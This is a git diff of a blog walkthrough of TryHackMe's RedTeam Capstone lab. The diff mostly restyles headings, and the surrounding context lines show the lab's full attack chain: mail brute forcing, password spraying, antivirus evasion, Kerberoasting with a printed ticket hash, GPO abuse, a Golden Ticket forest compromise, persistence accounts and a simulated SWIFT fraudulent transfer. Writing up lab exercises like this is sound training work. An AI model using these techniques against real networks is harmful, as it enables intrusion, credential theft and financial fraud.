@@ -1,16 +1,16 @@
 ---
-title: I Hacked The Bank | TryHackMe RedTeam Capstone Challenge Walkthrough
+title: Breaking the Vault | A Detailed Walkthrough of the RedTeam Capstone Challenge
 author: Muhammad Adel
 date: 2024-07-26 18:52:00 +0200
 categories: [RedTeaming]
 tags: [tryhackme, redteam , active directory, windows, writeups]
 ---
 TryHackMe’s RedTeam Capstone Challenge provides an unparalleled, hands-on experience that simulates real-world hacking scenarios. This challenge tests your skills in network infiltration, vulnerability exploitation, and navigating complex defenses.
-
+![Untitled](/assets/N-RedTeamCC/badge.png)
 Peace be upon all of you, In this writeup, I won't just be sharing the direct solutions. Instead, I'll take you on a journey through my own experiences, including the failed attempts and the lessons learned. Together, we'll navigate the twists and turns of this capstone challenge, making it feel as if you're solving it yourself. Get ready to dive deep into the world of red teaming, and let's hack the bank.
 
-# Introduction
-## Project Overview
+# **Introduction**
+## **Project Overview**
 TryHackMe, a cybersecurity consultancy firm, has been approached by the government of Trimento to perform a red team engagement against their Reserve Bank (TheReserve).
 
 Trimento is an island country situated in the Pacific. While they may be small in size, they are by no means not wealthy due to foreign investment. Their reserve bank has two main divisions:
@@ -20,7 +20,7 @@ Trimento is an island country situated in the Pacific. While they may be small i
 
 The Trimento government has stated that the assessment will cover the entire reserve bank, including both its perimeter and internal networks. They are concerned that the corporate division while boosting the economy, may be endangering the core banking system due to insufficient segregation. The outcome of this red team engagement will determine whether the corporate division should be spun off into its own company.
 
-## Project Goal
+## **Project Goal**
 The purpose of this assessment is to evaluate whether the corporate division can be compromised and, if so, determine if it could compromise the bank division. A simulated fraudulent money transfer must be performed to fully demonstrate the compromise.
 
 To do this safely, TheReserve will create two new core banking accounts for you. You will need to demonstrate that it's possible to transfer funds between these two accounts. The only way this is possible is by gaining access to SWIFT, the core backend banking system.
@@ -39,7 +39,7 @@ However, the SWIFT backend exposes an internal web application at [http://swift
 
 Separation of duties is performed to ensure that no single employee can both capture and approve the same transfer.
 
-## Project Scope
+## **Project Scope**
 This section details the project scope.
 **In-Scope**
 - Security testing of TheReserve's internal and external networks, including all IP ranges accessible through your VPN connection.
@@ -54,12 +54,12 @@ This section details the project scope.
 - External (internet) OSINT gathering.
 - Attacking any hosts outside of the provided subnet range. Once you have completed the questions below, your subnet will be displayed in the network diagram. This 10.200.X.0/24 network is the only in-scope network for this challenge.
 
-## Project Tools
+## **Project Tools**
 In order to perform the project, the government of Trimento has decided to disclose some information and provide some tools that might be useful for the exercise. You do not have to use these tools and are free to use whatever you prefer. If you wish to use this information and tools, you can either find them on the AttackBox under **`/root/Rooms/CapstoneChallenge`** or download them as a task file using the blue button at the top of this task above the video. If you download them as a task file, use the password of **`Capstone`** to extract the zip. Note that these tools will be flagged as malware on Windows machines.
 
 **Note**: For the provided password policy that requires a special character, the characters can be restricted to the following: **`!@#$%^`**
 
-## Project Registration
+## **Project Registration**
 The Trimento government mandates that all red teamers from TryHackMe participating in the challenge must register to allow their **single point of contact** for the engagement to track activities. As the island's network is segregated, this will also provide the testers access to an email account for communication with the government and an **approved phishing email address**, should phishing be performed.
 
 To register, you need to get in touch with the government through its e-Citizen communication portal that uses SSH for communication. Here are the SSH details provided:
@@ -79,7 +79,7 @@ As you make your way through the network, you will need to prove your compromise
 
 **Note: If the network has been reset or if you have joined a new subnet after your time in the network expired, your e-Citizen account will remain active. However, you will need to request that the system recreates your mailbox for you. This can be done by authenticating to e-Citizen and then selecting option 3.**
 
-## Summary
+## **Summary**
 Please make sure you understand the points below before starting. If any point is unclear, please reread this task.
 
 - The purpose of this assessment is to evaluate whether the corporate division can be compromised and, if so, determine if it could result in the compromise of the bank division.
@@ -92,11 +92,11 @@ Please make sure you understand the points below before starting. If any point i
 - You will need to prove compromises by performing specific steps on the host that you have compromised. These steps will be provided to you through the e-Citizen portal.
 ![Untitled](/assets/N-RedTeamCC/08d12c36-9c71-4668-8f59-1d9adf1d5725.png)
 
-# Preparations
-## Capstone Challenge Resources
+# **Preparations**
+## **Capstone Challenge Resources**
 Downloading the Capstone Challenge resources, we receive two files detailing the current password policies and a base list of passwords. Additionally, we get a list of common tools to use throughout the challenge.
 
-## Updating the hosts file
+## **Updating the hosts file**
 We start by adding the IP addresses in our hosts file, so that we can resolve hostname even if we change subnets.
 ```txt
 10.200.89.11 MAIL.thereserve.loc
@@ -104,7 +104,7 @@ We start by adding the IP addresses in our hosts file, so that we can resolve ho
 10.200.89.13 WEB.thereserve.loc
 ```
 
-## SSH Registration
+## **SSH Registration**
 We accessed the e-citizen communication portal via SSH using the provided credentials and registered our account. This portal will be crucial for proving the compromises, as it requires us to perform specific steps on the compromised hosts.
 ```bash
 $ ssh e-citizen@10.200.113.250
@@ -138,9 +138,9 @@ Any attempts made against this machine will result in a ban from the challenge.
 Best of luck and may you hack the bank!
 ```
 
-# Exploring The Network
-## WEB Machine
-### Nmap
+# **Exploring The Network**
+## **WEB Machine**
+### **Nmap**
 We will start by doing Nmap to know the available ports on the WEB machine.
 ```bash
 nmap -p- 10.200.113.13           
@@ -151,7 +151,7 @@ PORT   STATE SERVICE
 80/tcp open  http
 ```
 
-### The Web Page
+### **The Web Page**
 This IP is hosting a web page that gives us an overview about the company and its team. As this simulates real red team engagements, knowing company workers is a critical part of any redteam engagements.
 ```bash
 Aimee Walker -- Lead Developers
@@ -175,8 +175,7 @@ mohammad ahmed
 Also, looking at the image name gave us hints about the email creation rules that are being used by the organization: `firstname.lastname@domain.com`
 ![Untitled](/assets/N-RedTeamCC/Untitled.png)
 
-### Directory Brute forcing
-
+### **Directory Brute forcing**
 ```bash
 ┌──(root㉿kali)-[/opt/dirsearch]
 └─$ python3 dirsearch.py -u 10.200.113.13 -e php --random-agent
@@ -260,8 +259,8 @@ Target: http://10.200.113.13/
 ![Untitled](/assets/N-RedTeamCC/Untitled%204.png)
 Hmm! But what could be the username and the password for this? Let’s resume our enumeration for other exposed IPs, such as the VPN and Mail Server.
 
-## VPN Machine
-### Nmap
+## **VPN Machine**
+### **Nmap**
 ```bash
 # Nmap 7.93 scan initiated Sat May 13 14:29:54 2023 as: nmap -p- --min-rate 5000 -oN
 scans/nmap_alltcp.md 10.200.103.12
@@ -275,11 +274,11 @@ PORT STATE SERVICE
 # Nmap done at Sat May 13 14:30:05 2023 -- 1 IP address (1 host up) scanned in 11.71 
 ```
 
-### The Web Page
+### **The Web Page**
 a normal login page, but if we got any creds we will get access to the Internal Network.
 ![Untitled](/assets/N-RedTeamCC/Untitled%205.png)
 
-### Directory Brute forcing
+### **Directory Brute forcing**
 ```bash
 ┌──(root㉿kali)-[/opt/dirsearch]
 └─$ python3 dirsearch.py -u http://10.200.113.12/ --random-agent
@@ -343,8 +342,8 @@ Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
 ```
 Who are those **10.200.x.21/22** ?? Let’s put them aside for now and resume our enumeration phase on the MAIL machine.
 
-## Mail Machine
-### Nmap
+## **Mail Machine**
+### **Nmap**
 ```bash
 # Nmap 7.93 scan initiated Sat May 13 12:22:57 2023 as: nmap -p- --min-rate 5000 -oN
 scans/nmap_alltcp 10.200.103.11
@@ -453,10 +452,10 @@ PORT      STATE  SERVICE       VERSION
 
 ```
 
-### The Web Page
+### **The Web Page**
 ![Untitled](/assets/N-RedTeamCC/Untitled%206.png)
 
-### Directory Brute forcing
+### **Directory Brute forcing**
 ```bash
 ──(root㉿kali)-[~]
 └─$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.200.89.11//october/index.php/FUZZ
@@ -485,7 +484,7 @@ ________________________________________________
 ```
 It seems nothing there!
 
-### Accessing Our MailBox
+### **Accessing Our MailBox**
 As the SSH Server instructions suggest, it gave us creds for an email, so let’s download any mail service like **thunderbird** to get access to our inbox.
 ```bash
 $ tar xjf thunderbird-*.tar.bz2 
@@ -500,7 +499,7 @@ Once connected, we will find the following message:
 I have tried to send emails to others members to see If I could phish other users and get access, but it gives me the following error:
 ![Untitled](/assets/N-RedTeamCC/Untitled%209.png)
 
-### Password Mangling
+### **Password Mangling**
 It seems that we are running out of options. The last thing that I can think of is brute forcing. At the beginning of the challenge, we have been provided with `password_base_list.txt` that contains some sample passwords:
 ```txt
 TheReserve
@@ -525,7 +524,7 @@ The password policy for TheReserve is the following:
 * special character !@#$%^
 ```
 So we could expand our wordlist using the mangling technique.
-### Mangler Script
+### **Mangler Script**
 With the help of ChatGPT "he" has created the following script:
 ```python
 import itertools
@@ -564,7 +563,7 @@ with open('generated_passwords.txt2', 'w') as f:
 
 Running the script will expand our wordlist with, 1440 new passwords. We have multiple choices for using this wordlist as we have *( The Admin Panel for October CMS - The VPN Portal -  SSH Services and others - SMTP Mail Server ).* 
 
-### Brute forcing the Mail Server
+### **Brute forcing the Mail Server**
 We have already collected some info about the team working for the Reserve company and already know the email format that is being used. Let’s create our email wordlist and start the attack.
 ```txt
 aimee.walker@corp.thereserve.loc
@@ -608,7 +607,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-21 14:31:
 Yess!! We have a valid creds. I thought of accessing their mailbox might lead to sensitive information, but it is EMPTY :)
 ![Untitled](/assets/N-RedTeamCC/Untitled%2010.png)
 
-### Password Spraying
+### **Password Spraying**
 Hmm! Since there are no emails in their inbox, let’s try to spray those valid creds on the available services. I have tried those creds against the following: 
 - **10.200.113.11** — MailBox - SSH - RDP
 - **10.200.113.12** — SSH - VPN Portal Login
@@ -631,7 +630,7 @@ Hmm! Since there are no emails in their inbox, let’s try to spray those valid 
 
 1 of 1 target successfully completed, 2 valid passwords found
 ```
-# Foothold on The Corporate Division Tier 2 Infrastructure
+# **Foothold on The Corporate Division Tier 2 Infrastructure**
 let’s access them and see what is inside.
 ```bash
 $ xfreerdp /u:mohammad.ahmed /p:'Password1!' +clipboard /dynamic-resolution /cert:ignore /v:10.200.113.21 /drive:share,/opt/
@@ -713,9 +712,9 @@ We are now able to obtain the following flags:
 ***- Flag 3, Foothold on Corporate Division Tier 2 Infrastructure***
 ![Untitled](/assets/N-RedTeamCC/Untitled%2014.png)
 
-# Administrative access to Corporate Division Tier 2 Infrastructure
-## WRK1 Machine
-### Enumeration
+# **Administrative access to Corporate Division Tier 2 Infrastructure**
+## **WRK1 Machine**
+### **Enumeration**
 **NMAP**
 Let's see the open ports and available services.
 ```bash
@@ -874,7 +873,7 @@ At line:1 char:1
 
 ```
 
-### AV Evasion
+### **AV Evasion**
 So I have tried a simple way to bypass it. Removing most of the comments in the file and changing the file name.
 ```powershell
 PS C:\Users\mohammad.ahmed> Import-Module  \\tsclient\share\notpv.ps1
@@ -953,7 +952,7 @@ instancetype          : 4
 objectguid            : ef6d9255-1df6-480e-86f6-ae870f3e490b
 objectcategory        : CN=Group,CN=Schema,CN=Configuration,DC=thereserve,DC=loc
 ```
-### Privilege Escalation
+### **Privilege Escalation**
 I found an interesting folder Called **"Backup Service"** in the root directory of `C:` that had another folder inside of it called "Full Backup" that had an executable file in it called `backup.exe`. 
 ```powershell
 PS C:\> ls
@@ -1037,7 +1036,7 @@ C:\Windows\system32>hostname
 hostname
 WRK1
 ```
-### Persistence
+### **Persistence**
 let’s do persistence and create our own privileged username.
 
 ```bash
@@ -1054,9 +1053,9 @@ The command completed successfully.
 We are now able to obtain the following flag:
 - ***Administrative access to Corporate Division Tier 2 Infrastructure***
 
-# Corporate Division Tier 1 Infrastructure
-## WRK1 Machine
-### Enumeration
+# **Corporate Division Tier 1 Infrastructure**
+## **WRK1 Machine**
+### **Enumeration**
 We have achieved local administrator access on the machine. However, to fully compromise the Active Directory, we need to obtain a Domain Administrator account. I have dived deep into enumeration, and I couldn’t find something interesting except this service account.
 ```powershell
 PS C:\Users\mohammad.ahmed> Get-DomainUser -Identity **svcOctober**
@@ -1096,7 +1095,7 @@ usnchanged            : 527762
 ```
 Usually in any tryhackme ad room, if there are any service accounts, these accounts will be Kerberoastable and their passwords can be cracked. Let’s follow our intuition and see.
 
-### Kerbroasting
+### **Kerbroasting**
 **Remotely**
 I have tried this attack from my kali machine but it wasn’t working at all. and I wasn’t sure what was the reason.
 ```bash
@@ -1138,12 +1137,12 @@ And let’s try to crack those Kerberos tickets hashes with Hashcat. Unfortunate
 $krb5tgs$23$*svcScanning$corp.thereserve.loc$cifs/scvScanning*$3c70f983c9acda432f26512a5a5737a1$a337fb6cc70470fb26daf6dff8f3a13e394043c0f8e20eabfdc0de508aaa344d27289c155b4afdcfe91b69841ed1a734bb9848d9c459acfa8c5403ce6e24d4e84666a786ec8c667cac9bea1a58aee4ad18f0a0fd313096a389d9b87c92a8747c674c5aa116c4a6e5957bc0e4ebec4b535edda0bbffe8bfe8953717c02f3c59b3041e0d6a3ab60915498dfaa12ede45ee126809cb8ae4bdaa5914c54e4f38eb338cc19df5dec384ba5840a9c846d4d570a9f632f2e4cc7d1829242ec437690ef70c0dab8fa99a723df232a3ea7719664afa146afac9915674da4f93e1f4a3c9d5f01563682e158a2e74a4649ea62b7790bd09ff5a5f942ceed23de9680db06c86d5dc02af788295f6b6c300cd007801d507ab2a0cf6aa6cf2e3999d8097bbb75deb7f87493aced88cbb221f23d5ae04a3faba8bfa730dbf29719b589b296c80d1ae80239343c421a5d9d2c61def7c162bb37db39d61ac2ce6a07060537c2d7ff04ac7823facd26642ceec6702f4ced133fc26126f0f9dbdd460a3316c7a29cde1c6f631a9c5ed89b7fb322548d1ad19f4d79e7f43a9f87733b3798e34c0e4faae7055ebf467f7b87885d121324781ca11257783e216cabb9b9725a7938c026cad39fbdf8bf353a3fe814a2214bff2b31dd1a39630bcfd3404c8b36f6118c483d8c13e63fc5ab7bcec54b835eeba7049346449b46ff718df40316bf7ca2597c47bde6d9417fb9b0161a224ff7010e7d61e3a59d6f744f766c1c3d3ec1a663fa56d72acdc615a709bf00e1bfb5da5026ecb6757dc3db03e575f9e9d25fd90e0fe3e0a1601d54ff5d6b5c3c041faef12d88b1f2f45c2969fab93add7ee4252613c7f534c6cd8239533aadbf3741471043559b2627b7ddbd7a818f7400991965cfa723787c41425b5556f1dd29c9351fe23cdba6a24ef13e5f41548a1c9b74f672f8ce68dcae990afe8622bb8db779e5eb75a58dc89e4494bea5e17f309b50e441b69fe805eecd721f6a916a130452d5ae08e8a239dd36868580dc56f67c13457fd5781cc0a970c4e1371090e7a597021d2b7b8b91fdb662a0dbd04b605e551780fc697887b74ccb6c92f8ae83c7d1072fa441ab60a2e44d2a84ab92d0fefb42562d5d794895a75eac77c718e402667d895fe3c3319b7716d334b98289a07a60c8b55c3a215d873a97f6de51ebda290b80c94e64e6e0414c518dabc0912fb7f64988577bab69e36e291e6cebf88b35c07d560a78b74965e6931638b03f438c50ea4045d6ec3d239e5ac2bc7e7de665c2cdf6dac536547e8a1beea225cb55c9886a10a099e9af9f77dcdcd3956fa7b227fdf244f3f7a1fd8104e4fcd913c9d604d90ced1b78c0d1684dfb8c5f9fd2a415992d8fb73c63812ed00ad2d399a984db389ecb33bd91ae6e63f2f748d0299ef658058d7b381fd45545b6bf1bfb15e9f9e81a215db7244939918ed30981abf017301724c75ba183974302432b56a0d5805f479d177cd1be6b960f6fc328bf665659baf0757801eec8a367cb2d81db650853d68e992686a8abb47b071d3e75d0a17fb46fd774263c038278a29dd0986a2ccaccc63fd94b9a697834374f62c04c1cc514171a7bc70d6612fa86de41d171fb0d297197f87a97f36aed024a2c730380edcb56b6487d846a191ea491706c5a4542afe75701f165a8652255cfd26829f9abf4e38116f42defd798055b464ccba3287c767041eeb54d5004047bedc5316423f2fddc79368a8f6a27a748df20b:**Password1!**
 ```
 Also, another way that I have tried is doing password spraying. As we have two valid passwords, we can use them against all enumerated users.
-### Password Spraying
+### **Password Spraying**
 ```bash
 $ crackmapexec smb 10.200.113.21 -u All_users.txt -p valid_passwords --continue-on-success
 **SMB         10.200.113.21   445    WRK1             [+] corp.thereserve.loc\svcScanning:Password1!** 
 ```
-### BloodHound
+### **BloodHound**
 After we have pawned this user, let’s gather more info about it so we can identify how we are going to use it further.
 ```powershell
 PS C:\Users\mohammad.ahmed> Get-DomainUser -Identity svcScanning
@@ -1260,8 +1259,8 @@ As we have recently compromised the SvcScanning user via a kerberoasting attack,
 ![Untitled](/assets/N-RedTeamCC/70923f00-e58f-4f92-9811-13f64d4f776b.png)
 GREAAAT! It seems that the svcScanning user is a member of the `services@corp.thereserve.loc` and has the permission to execute remote PowerShell commands on the `server2.corp.thereserve.loc` computer.
 
-## SERVER2 Machine
-### Foothold
+## **SERVER2 Machine**
+### **Foothold**
 **PowerShell Remote**
 ```powershell
 PS C:\Users\mohammad.ahmed> $Secpass = ConvertTo-SecureString 'Password1!' -AsPlainText -Force
@@ -1284,7 +1283,7 @@ SERVER2
 ```
 Now we have access to a `server2.corp.thereserve.loc` computer. But unfortunately, we don’t have direct access from our attacker machine to SERVER1 or SERVER2. So we need to establish port forwarding to ease the process of exploitation and privilege escalation.
 
-### Dynamic Port Forwarding
+### **Dynamic Port Forwarding**
 As we have ssh enabled on WRK1 and WRK2 machines, let’s create a secure tunnel via SSH using the dynamic port forwarding method.
 ```powershell
 # On WRK1 Machine
@@ -1317,9 +1316,9 @@ We are now able to obtain the following flags:
 ***- Flag 5, Foothold on Corporate Division Tier 1 Infrastructure***
 ***- Flag 6, Administrative access to Corporate Division Tier 1 Infrastructure***
 
-# Full Compromise of CORP Domain
-## SERVER2 Machine
-## Exploiting GPO GenericWrite
+# **Full Compromise of CORP Domain**
+## **SERVER2 Machine**
+### **Exploiting GPO GenericWrite**
 Since we got access to SERVER1 and SERVER2, let’s execute the attack vector that was suggested by Bloodhound.
 ![Untitled](/assets/N-RedTeamCC/70923f00-e58f-4f92-9811-13f64d4f776b.png)
  As `SvcScanning`user has GenericWrite permission over the DC Backups group policy which is linked with the Domain Controllers group and the CORPDC Machine. Meaning, if we were able to exploit it, we will get access to the DC machine. Let’s first open MMC and add the group policy management snap in. then choose the DC Backup Policy and edit.
@@ -1371,9 +1370,9 @@ Woo! Now we can RDP to the DC machine, and we are now Domain Admins and OWN the 
 
 ![Untitled](/assets/N-RedTeamCC/d9ab914b-c1ac-4de2-a2f7-8efa8b2c5ede.png)
 
-# Full Compromise of ROOTDC
-## CORPDC Machine
-### Enumeration
+# **Full Compromise of ROOTDC**
+## **CORPDC Machine**
+### **Enumeration**
 Now we are part of the domain admins group and we own a child domain inside the whole forest. So let’s enumerate some information about the forest and the domain trust.
 
 ```powershell
@@ -1420,7 +1419,7 @@ Let’s simplify it with the following diagram:
 
 As the CORP child trusts the ROOT domain and the BANK domain also trusts the ROOT domain also, then both the CORP and BANK domains will trust each other as the trust type is transitive. Therefore, if we compromise a child domain, we can access the other child domain.
 
-### Exploiting Transitive Trust
+### **Exploiting Transitive Trust**
 A Golden Ticket attack is a way of creating a forged TGT with a stolen KDC key, which enables us to gain access to any service on the domain, essentially becoming our own Ticket Granting Server (TGS). In order to perform a Golden Ticket attack, we will need the following information:
 
 - The Full Qualified Domain Name (FQDN) of the Domain
@@ -1499,7 +1498,7 @@ C:\Windows\system32>dir \\rootdc.thereserve.loc\c$
                6 Dir(s)  22,418,341,888 bytes free
 ```
 
-### Lateral Movement
+### **Lateral Movement**
 As our golden ticket is loaded into memory, and we have access to the ROOTDC machine, we need to perform lateral movement and establish a shell on this machine. A simple way would be by running psexec remotely on the ROOTDC machine.
 ```powershell
 PS C:\Users\svcScanning\Desktop> .\psexec.exe \\ROOTDC.thereverse.loc cmd.exe
@@ -1534,9 +1533,9 @@ We are now able to obtain the following flags:
 ***- Flag 15, Foothold on Parent Domain***
 ***- Flag 16, Administrative access to Parent Domain***
 
-# Full Compromise of BANK Domain
-## ROOTDC Machine
-### Persistence
+# **Full Compromise of BANK Domain**
+## **ROOTDC Machine**
+### **Persistence**
 Great, we have a fully interactive shell, let’s create our own user and add it to the enterprise admin group.
 ```powershell
 C:\Users\Administrator.CORP>net user ItsFadinG "Password1!" /domain
@@ -1556,7 +1555,7 @@ Info: Establishing connection to remote endpoint
 ROOTDC
 ```
 
-### Port Forwarding
+### **Port Forwarding**
 We are now having access to the ROOTDC therefore, from here we can access the child domain BANK.thereverse.loc but we can’t access it directly from our own attacking machine. Therefore, we need to establish tunneling from the ROOTDC. We are assigned two interfaces, one for the tryhackme VPN and the other for the Corp VPN, from that, we previously accessed the internal network.
 ```bash
 ┌──(root㉿kali)-[~/THM/N-RedTeamCC/proxychains]
@@ -1632,9 +1631,9 @@ Since we have an administrator account then all child domains are owned now and 
 ***- Flag 14, Administrative access to Bank Division Tier 0 Infrastructure***
 ![Untitled](/assets/N-RedTeamCC/Untitled%2019.png)
 
-# Compromise of SWIFT and Payment Transfer
-## BANKDC Machine
-### Enumeration
+# **Compromise of SWIFT and Payment Transfer**
+## **BANKDC Machine**
+### **Enumeration**
 Let’s create our own user and enumerate the groups:
 ```powershell
 PS C:\Users\Administrator> net user ItsFadinG "adeladel22!" /domain /add
@@ -1683,8 +1682,8 @@ the government of Trimento has shared some information about the SWIFT backend s
 ```
 So what we need is to access the SWIFT web application, perform a transaction and have the ability to capture it and approve it. As the diagram of this network suggests, the SWIFT machine can be accessed only from the JMP machine.
 
-## JMP Machine
-### Enumeration
+## **JMP Machine**
+### **Enumeration**
 ```bash
 $ proxychains -q -f proxychains_ROOTDC_To_BANKDC.conf xfreerdp /u:ItsFadinG /p:'adeladel22!' +clipboard /dynamic-resolution /cert:ignore /v:10.200.89.61
 [13:43:25:568] [1073491:1073501] [ERROR][com.winpr.timezone] - Unable to get current timezone rule
@@ -1702,7 +1701,7 @@ JMP
 Let’s access the SWIFT web application:
 ![Untitled](/assets/N-RedTeamCC/Untitled%2020.png)
 
-### Dynamic Port Forwarding
+### **Dynamic Port Forwarding**
 For better application inspection with Burp Suite, we could use Dynamic port forwarding to access this Swift web app from our attacking machine.
 ```bash
 PS C:\Users\ItsFadinG> ssh tunneluser@10.50.87.39 -R 9070 -N
@@ -1713,7 +1712,7 @@ Warning: Permanently added '10.50.87.39' (ECDSA) to the list of known hosts.
 tunneluser@10.50.87.39's password:
 ```
 
-### Access to SWIFT application
+### **Access to SWIFT application**
 Now we can gain flag 17 ***"Access to SWIFT application"  let’s see the instructions***
 ```bash
 In order to proof that you have access to the SWIFT system, dummy accounts have been created for you and you will have to perform the following steps to prove access.
@@ -1744,8 +1743,7 @@ We have received flag 17, but after that we have received an important email:
 ![Untitled](/assets/N-RedTeamCC/Untitled%2023.png)
 As stated, we need to have a capturer and approver account to be able to create our own transfer from start to finish and show impact.
 
-### SWIFT Capturer and Capturer Access
-
+### **SWIFT Capturer and Capturer Access**
 If you remember from our previous enumeration, we have found two interesting groups and added our users to them **( Payment Approvers - Payment Capturers ).** Let’s try to log in to the application using our domain username:
 ![Untitled](/assets/N-RedTeamCC/Untitled%2024.png)
 Unfortunately, it didn’t work. Let’s check the other user, then change his password and try to login again.
@@ -1851,7 +1849,7 @@ Look for this transfer and approve (forward) the transaction.
 ```
 ![Untitled](/assets/N-RedTeamCC/Untitled%2029.png)
 
-### SWIFT Simulated Fraudulent Transfer
+### **SWIFT Simulated Fraudulent Transfer**
 We are one step away from our final goal and the last flag, ***Flag-20: Simulated fraudulent transfer made***.
 ```bash
 This is the final check! Please do not attempt this if you haven't completed all of the other flags.
@@ -1877,9 +1875,9 @@ And We Hacked the Bank!!
 ![Untitled](/assets/N-RedTeamCC/Untitled%2034.png)
 ![Untitled](/assets/N-RedTeamCC/Untitled%2035.png)
 
-# Summary
+# **Summary**
 As Pivoting is a crucial step in any red team engagements, and it is a bit hard to follow. I decided to create a summary of my port forwarding methodology, which exclusively utilized Dynamic SSH Port Forwarding. This approach enabled secure, flexible access to internal network resources, playing a pivotal role in my overall strategy.
 ![Untitled](/assets/N-RedTeamCC/PF-Summary.png)
 
-# Conclusion
+# **Conclusion**
 Completing the RedTeam Capstone Challenge was a journey that took me over two months, balanced alongside my military service. By sharing not only the direct solutions but also my failed attempts, I aimed to provide a more immersive experience. I hope you enjoyed it. Thank you for following along with my writeup. I welcome any feedback you may have. Until next time, Peace!!
